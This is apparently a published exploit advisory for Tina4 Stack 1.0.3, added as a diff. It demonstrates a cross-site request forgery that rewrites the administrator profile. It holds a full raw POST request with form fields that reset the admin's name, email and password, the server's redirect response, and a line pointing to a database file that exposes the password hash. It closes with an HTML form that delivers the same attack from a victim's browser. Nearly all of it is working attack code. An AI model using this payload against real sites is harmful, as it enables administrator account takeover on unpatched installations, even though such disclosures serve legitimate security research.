@@ -1,0 +1,89 @@
+# Exploit Title: Tina4 Stack 1.0.3 - Cross-Site Request Forgery (Update Admin)
+# Dork: N/A
+# Date: 2018-11-09
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://tina4.com/
+# Software Link: https://ayera.dl.sourceforge.net/project/tina4stack/v1.0.3/Release%20V1.0.3.zip
+# Version: 1.0.3
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/kim/profile
+# 
+POST /[PATH]/kim/profile HTTP/1.1
+Host: TARGET:12345
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: TINA4=ov6d6tvb04jf1drutog305d3a0
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=
+---------------------------2889126544277769229510236
+Content-Length: 1183
+-----------------------------2889126544277769229510236
+Content-Disposition: form-data; name="txtUSER_ID"
+1
+-----------------------------2889126544277769229510236
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+4194304
+-----------------------------2889126544277769229510236
+Content-Disposition: form-data; name="txtPHOTO"; filename=""
+Content-Type: application/octet-stream
+-----------------------------2889126544277769229510236
+Content-Disposition: form-data; name="txtFIRST_NAME"
+Admin_Efe
+-----------------------------2889126544277769229510236
+Content-Disposition: form-data; name="txtLAST_NAME"
+Admin_Efe
+-----------------------------2889126544277769229510236
+Content-Disposition: form-data; name="txtEMAIL"
+admin_Efe
+-----------------------------2889126544277769229510236
+Content-Disposition: form-data; name="txtPASSWORD"
+admin_Efe
+-----------------------------2889126544277769229510236
+Content-Disposition: form-data; name="txtSTATUS"
+Active
+-----------------------------2889126544277769229510236
+Content-Disposition: form-data; name="txtCREATED"
+2018-11-09 15:25:24
+-----------------------------2889126544277769229510236--
+HTTP/1.1 302 Found
+Server: nginx/1.7.7
+Date: Fri, 09 Nov 2018 17:05:44 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/7.0.0
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location: /kim/profile
+
+#/[PATH]/kim.db
+#view-source: 3ˆ	Admin_EfeAdmin_Efeadmin_Efe$2y$10$I6HLywdXPGjxy6XLZQ0uT.E/eKrlLQbyCwOlsuZZl75i.HGuWscRq2018-11-09 15:25:24Active
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/kim/profile
+# 
+<html>
+<body>
+<form method="post" action="http://localhost:12345/kim/profile" enctype="multipart/form-data">
+<input placeholder="User Id" name="txtUSER_ID" id="txtUSER_ID" value="1" type="hidden">
+<input name="MAX_FILE_SIZE" value="4194304" type="hidden">
+<input name="txtPHOTO" id="txtPHOTO" onclick="" value="Photo" type="file">
+<input placeholder="First Name" name="txtFIRST_NAME" id="txtFIRST_NAME" value="Admin" aria-required="true" aria-invalid="false" type="text">
+<input placeholder="Last Name" name="txtLAST_NAME" id="txtLAST_NAME" value="Admin" type="text">
+<input placeholder="Email" name="txtEMAIL" id="txtEMAIL" value="admin" type="text">
+<input class="form-control" placeholder="Password" name="txtPASSWORD" id="txtPASSWORD" value="" type="password">
+<select class="form-control" id="txtSTATUS" name="txtSTATUS"><option selected="selected" value="Active">Active</option><option value="Disabled">Disabled</option><option value="Suspended">Suspended</option></select>
+<input placeholder="Created" name="txtCREATED" id="txtCREATED" value="2018-11-09 15:25:24" type="text">
+<input value="Save" type="submit">
+</form>
+</body>
+</html>
